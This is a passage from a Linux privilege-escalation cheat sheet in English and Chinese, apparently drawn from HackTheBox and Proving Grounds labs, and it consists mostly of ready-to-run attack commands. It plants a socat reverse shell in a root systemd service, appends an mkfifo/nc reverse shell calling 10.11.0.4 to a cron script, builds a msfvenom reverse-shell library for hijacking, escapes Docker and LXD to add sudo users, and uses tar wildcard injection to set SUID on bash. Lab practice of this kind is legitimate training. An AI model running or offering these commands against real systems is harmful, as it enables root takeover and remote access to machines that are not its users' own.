find /etc -type f -writable 2> /dev/null

## change file to get reverse; user=root, ExecStart= reverse shell script
cat <<'EOT'> /etc/systemd/system/pythonapp.service
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
ExecStart=/home/cmeeks/reverse.sh
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
EOT

cat <<'EOT'> /home/cmeeks/reverse.sh
#!/bin/bash
socat TCP:192.168.118.8:18000 EXEC:sh
EOT

## reboot to get shell
sudo reboot
```

## path misconfiguration
参考[Hacking Linux Part I: Privilege Escalation By gimboyd](http://www.dankalia.com/tutor/01005/0100501004.htm)

## cronjob 定时任务
查看定时任务，根据情况进行提权。一般运行脚本、写文件等
[pspy](https://github.com/DominicBreuker/pspy)查看定时任务
参考 [htb-friendzone](http://0x4242.net/log/2019-07-13_htb_friendzone/)

```
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.0.4 1234 >/tmp/f" >> user_backups.sh

./pspy64 -pf -i 1000
```

## Docker
参考：docker提权原理，通过文件映射挂载/root目录，直接读取flag。详细可参考如下链接。
https://www.hackingarticles.in/docker-privilege-escalation/
https://www.freebuf.com/articles/system/170783.html

kali下载镜像生成Dockerfile，上传靶机构建镜像

```
wget https://dl-cdn.alpinelinux.org/alpine/v3.14/releases/x86_64/alpine-minirootfs-3.14.1-x86_64.tar.gz
vim Dockerfile

FROM scratch
ADD alpine-minirootfs-3.14.1-x86_64.tar.gz /
CMD ["/bin/sh"]

python -m SimpleHTTPServer 8080

#靶机
wget http://192.168.3.117:8080/alpine-minirootfs-3.14.1-x86_64.tar.gz
wget http://192.168.3.117:8080/Dockerfile

docker build -t alpine:3.14 .
```

**提权方式1，挂载/root 读取信息**

```
docker run -v /root/:/mnt -it alpine:3.14
```

**提权方式2，映射/etc添加用户**

```
docker run -it --rm -v /etc:/etc alpine:3.14 /bin/sh

adduser test
usermod -aG sudo test
#或者
adduser test sudo

#退出docker
sudo su
```

**docker container breakout**
+ docker container breakout/escape; pg-sirol
+ [container breakout](https://tbhaxor.com/container-breakout-part-1/)
+ [hacktricks-breakout](https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout)

## lxd/lxc group
same to docker
[hacktricks-lxcd/lxc group PE](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
[htb-brainfuck](https://p0i5on8.github.io/posts/hackthebox-brainfuck/#vigenere-cipher)

* method 1
https://github.com/lxc/distrobuilder

```
#-Prepare image
sudo su
#Install requirements
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
#Clone repo
sudo go get -d -v github.com/lxc/distrobuilder
#Make distrobuilder
cd $HOME/go/src/github.com/lxc/distrobuilder
make
#Prepare the creation of alpine
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
#Create the container
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8

#-upload image to target, add this image
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list #You can see your new imported image

#-create container and add root path
lxc init alpine privesc -c security.privileged=true
lxc list #List containers

lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true

#-execute container
lxc start privesc
lxc exec privesc /bin/sh
[email protected]:~# cd /mnt/root #Here is where the filesystem is mounted
```
> **Error: No storage pool found. Please create a new storage pool**
> run **lxc init**, repeat create step

* method 2
Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.

```
# build a simple alpine image
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686

# import the image
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

# before running the image, start and configure the lxd storage pool as default
lxd init

# run the image
lxc init myimage mycontainer -c security.privileged=true

# mount the /root into the image
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
 
# interact with the container
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

## Lib hijack
+ writable to lib path, exploit with cronjob/script/suid and so on. pg-sybaris

```bash
# check cronjob, will contains lib path;
cat /etc/crontab

# check lib path permission.
# check the list of shared object loaded by command
ldd /usr/bin/log-sweeper
        linux-vdso.so.1 =>  (0x00007ffd61a5c000)
        utils.so => not found
        libc.so.6 => /lib64/libc.so.6 (0x00007f717136a000)
        /lib64/ld-linux-x86-64.so.2 (0x00007f7171738000)

# generate so and exploit
msfvenom -p linux/x64/shell_reverse_tcp -f elf-so -o utils.so LHOST=kali LPORT=6379
cp /var/ftp/pub/utils.so /usr/local/lib/dev/utils.so
```

## backup
+ backup script, decrypt file. pg-shifty
+ backup job with file writable
+ backup job, writable script
+ backup job, writable to backup content/file
+ 

## command injection
+ insteresting scripts, (eg.sh/python/perl)
+ check file permission if you have write permission.
+ check file content, if script run exec; 

```bash
# command exec 
## ; | || & - `
## bypass, $()
ping 10.10.10.$(echo 123)

```

## wildcards

### tar
+ Execute arbitrary commands, cronjob
+ tar extract file with the suid property; htb-tartarsauce;
+ auto exploit, [wildpwn](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py)
+ more info [papers-33930]( https://www.exploit-db.com/papers/33930)

```bash
# tar file, exploit wildcards
touch ./"--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"

## pg-readys
echo "chmod +s /bin/bash" > exploit.sh
touch ./"--checkpoint=1"
touch ./"--checkpoint-action=exec=bash exploit.sh"

/bin/bash -p

# untar file with suid bit.
## use bash, setuid or other file.
sudo chown root:root bash

tar -zcvf bash.tar.gz ./

## check the executes time;
systemctl list-timers
```

## Other tricks
+ exiftool version < v12.24, RCE 
+ pg - exfiltrated

### exiftool
+ cronjob/suid/sudo, version < v12.24, RCE
+ [cve-2021-22204 mannul](https://blog.convisoappsec.com/en/a-case-study-on-cve-2021-22204-exiftool-rce/)
+ [python exploit](https://github.com/convisolabs/CVE-2021-22204-exiftool)

```bash
sudo apt install djvulibre-bin exiftool

# change ip in python
nc -nvlp 443

# generate jpg file with payload
python3 exploit.py
```

### MOTD exploit
+ motd.legal-displayed, if you found this file. 
+ exp, https://www.exploit-db.com/exploits/14339
+ htb popcorn

```bash
ls -l .cache/motd.legal-displayed 
-rw-r--r-- 1 george george 0 Mar 17  2017 .cache/motd.legal-displayed
```